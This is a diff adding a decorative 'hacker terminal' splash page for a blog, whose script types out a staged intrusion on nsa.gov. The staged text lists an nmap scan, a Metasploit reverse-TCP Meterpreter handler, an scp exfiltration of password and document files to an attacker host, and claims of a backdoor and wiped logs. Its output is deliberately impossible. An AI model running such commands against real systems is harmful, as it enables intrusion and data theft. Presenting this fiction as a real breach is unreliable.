@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Terminal trustinveritas</title>
+    <style>
+        body {
+            background-color: #1C202B;
+            color: #33ff33;
+            font-family: "Courier New", monospace;
+            text-align: center;
+            padding-top: 100px;
+        }
+        .terminal {
+            display: inline-block;
+            border: 2px solid #33ff33;
+            padding: 20px;
+            width: 1100px;
+            height: 800px;
+            background: rgba(28, 32, 43, 0.9);
+            box-shadow: 0 0 10px #33ff33;
+            text-align: left;
+            overflow-y: scroll;
+            white-space: pre-wrap;
+        }
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background: #33ff33;
+            animation: blink 0.6s infinite alternate;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        .blog-link {
+            display: none;
+            margin-top: 10px;
+        }
+        .blog-link a {
+            color: #33ff33;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .blog-link a:hover {
+            text-shadow: 0 0 5px #33ff33;
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal" id="terminal">
+        <p id="typing"></p><span class="cursor"></span>
+        <div class="blog-link" id="blog-link">
+            <a href="https://blog.salucci.ch" target="_blank" rel="noopener noreferrer">[ Enter Blog ]</a>
+        </div>
+    </div>
+
+    <script>
+        const commands = [
+            "$ whois nsa.gov",
+            "Domain Name: NSA.GOV",
+            "Registrar: NameCheap, Inc.",
+            "Creation Date: 2001-05-15T04:00:00Z",
+            "Expiration Date: 2026-05-15T04:00:00Z",
+            "",
+            "$ nmap -sS -p 1-65535 nsa.gov",
+            "Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-21",
+            "Scanning nsa.gov (192.168.1.1) [1000 ports]",
+            "PORT     STATE SERVICE",
+            "22/tcp   open  ssh",
+            "25/tcp   open  smtp",
+            "53/tcp   open  dns",
+            "80/tcp   open  http",
+            "110/tcp  open  pop3",
+            "443/tcp  open  https",
+            "3306/tcp open  mysql",
+            "8080/tcp open  http-proxy",
+            "MAC Address: 00:1A:2B:3C:4D:5E",
+            "",
+            "$ msfconsole",
+            "$ use exploit/multi/handler",
+            "$ set payload windows/meterpreter/reverse_tcp",
+            "$ set LHOST 192.168.1.100",
+            "$ set LPORT 4444",
+            "$ exploit",
+            "[*] Started reverse TCP handler on 192.168.1.100:4444",
+            "[*] Sending stage (175174 bytes) to 192.168.1.2",
+            "[*] Meterpreter session opened (192.168.1.100:4444 -> 192.168.1.2:49200) at 2025-02-21",
+            "",
+            "$ cd /home/nsa/confidential/",
+            "$ ls -lah",
+            "total 4.0K",
+            "drwxr-xr-x  2 root root 4.0K Feb 21 12:00 .",
+            "drwxr-xr-x 10 root root 4.0K Feb 21 11:00 ..",
+            "-rw-r--r--  1 root root 2.1M secret_docs.pdf",
+            "-rw-r--r--  1 root root 500K passwords.txt",
+            "-rw-r--r--  1 root root 3.5TB full_server_backup.tar.gz",
+            "",
+            "$ scp secret_docs.pdf passwords.txt full_server_backup.tar.gz hacker@192.168.1.100:/home/hacker/downloads/",
+            "hacker@192.168.1.100's password: ********",
+            "secret_docs.pdf                         100% 2.1MB  2.5MB/s   00:00",
+            "passwords.txt                           100% 500KB  1.2MB/s   00:00",
+            "full_server_backup.tar.gz               100% 3.5TB  500MB/s   02:00:00",
+            "[*] Initiating deep packet inspection bypass...",
+            "[*] Establishing persistent backdoor...",
+            "[*] Uploading exfiltrated data to offshore storage...",
+            "[*] Logs cleaned, forensic traces removed...",
+            "[*] System compromised beyond recovery."
+        ];
+
+        let line = 0;
+        function typeCommand() {
+            if (line < commands.length) {
+                document.getElementById("typing").innerHTML += commands[line] + "\n";
+                document.getElementById("terminal").scrollTop = document.getElementById("terminal").scrollHeight;
+                line++;
+                setTimeout(typeCommand, 1000);
+            } else {
+                document.getElementById("blog-link").style.display = "block";
+            }
+        }
+        window.onload = typeCommand;
+    </script>
+</body>
+</html>
